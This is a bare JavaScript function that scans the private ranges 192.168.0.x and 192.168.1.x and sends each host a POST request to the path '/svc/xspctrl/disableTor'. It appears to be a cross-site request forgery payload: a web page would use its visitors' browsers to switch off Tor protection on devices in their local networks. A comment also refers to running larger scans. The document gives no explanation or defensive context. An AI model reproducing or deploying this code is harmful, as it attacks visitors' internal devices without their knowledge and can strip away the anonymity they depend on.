function go() { 
   var IP_SCANS = 255;
   var prefixes = new Array("http://192.168.0.", "http://192.168.1.");
   //var prefix = "http://172.";
   var prefix = "http://192."
   var SECOND_START = 168;
   var SECOND_END = 168;
   var THIRD_START = 0;
   var THIRD_END = 1;
   var mydate = new Date();
   console.log(mydate.getTime());

   for (var i = SECOND_START; i <= SECOND_END; i++) {
      for (var j = THIRD_START; j <= THIRD_END; j++) {
         for (var k = 0; k < IP_SCANS; k++) 
         {
            var tryip = prefix +  i + "." + j + "." + k;
            var req = new XMLHttpRequest();
            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
            req.timeout = 1000;
            //console.log(reqs[i].readyState);
/*         req.onreadystatechange = function (ip) 
           { 
           return function() { console.log(ip); }
           } (tryip); */
            //console.log(reqs[i]);
            req.send();
         }
         // COMMENT THIS OUT BEFORE RUNNING LARGE SCANS!
         var mydate2 = new Date();
         console.log(mydate2.getTime() + " " + j);
      }
      var mydate = new Date();
      console.log(mydate.getTime() + " " + i);
   }
}
